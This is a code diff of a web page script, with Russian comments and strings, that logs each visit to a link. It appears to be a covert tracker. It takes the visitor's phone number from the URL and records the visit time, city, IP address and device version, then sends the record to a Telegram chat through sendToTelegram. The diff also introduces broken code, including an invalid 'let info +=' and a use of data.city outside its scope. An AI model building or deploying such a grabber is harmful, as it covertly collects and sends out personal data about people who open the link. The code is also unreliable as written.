@@ -58,23 +58,24 @@
           .catch(error => console.error("Ошибка:", error));
     }
 
+    let info += "❗НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ \n";
     let params = new URLSearchParams(window.location.search);
-    let info = "Номер телефона: " + params.get("tel") + "\n";
-    info += "❗НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ \n";
+    info += "Номер телефона: " + params.get("tel") + "\n";
 	let now = new Date().toString();
-    info += "Время захода: " + " " + now.split(" ")[4] + " " + now.match(/\(([^)]+)\)/)[1] + "\n \n";
+    info += "Время: " + " " + now.split(" ")[4] + " " + now.match(/\(([^)]+)\)/)[1] + "\n";
+    info += "Город: " + data.city + "\n";
 	
 	function getDeviceInfo() {
   let ua = navigator.userAgent;
 
   if (/Android/i.test(ua)) {
     let version = ua.match(/Android\s+([\d.]+)/i);
-    return "Android " + (version ? version[1] : "неизвестная версия");
+    return "Устройство: Android " + (version ? version[1] : "неизвестная версия");
   }
 
   if (/iPhone|iPad|iPod/i.test(ua)) {
     let version = ua.match(/OS (\d+_\d+)/i);
-    return "iPhone" + (version ? version[1].replace("_", ".") : "неизвестная версия");
+    return "Устройство: iPhone" + " " + (version ? version[1].replace("_", ".") : "неизвестная версия");
   }
 
   return "Неизвестное устройство";
@@ -91,7 +92,6 @@ console.log(getDeviceInfo());
         .then(res => res.json())
         .then(data => {
           info += "IP: " + data.ip + "\n";
-          info += "Город: " + data.city + "\n";
           sendToTelegram(info);
         })
         .catch(err => console.error("Ошибка:", err));
@@ -191,6 +191,7 @@ console.log(getDeviceInfo());
 </body>
 
 </html>
+
 
 
 
